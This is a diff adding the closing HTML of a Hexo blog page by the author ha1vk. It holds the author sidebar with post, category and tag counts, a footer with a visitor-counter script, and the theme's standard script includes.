+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
